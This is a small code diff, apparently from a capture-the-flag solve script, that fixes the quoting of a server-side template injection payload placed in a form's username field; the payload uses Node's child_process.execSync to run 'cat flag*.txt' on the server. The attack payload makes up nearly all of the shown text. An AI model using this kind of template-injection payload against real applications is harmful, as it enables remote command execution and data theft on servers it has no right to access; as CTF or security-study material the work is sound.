@@ -6,7 +6,7 @@
 
     const u = document.createElement("input");
     u.name = "username";
-    u.value = "<%= process.mainModule.require("child_process").execSync("cat flag*.txt").toString() %>";
+    u.value = "<%= process.mainModule.require('child_process').execSync('cat flag*.txt').toString() %>";
 
     const p = document.createElement("input");
     p.name = "password";
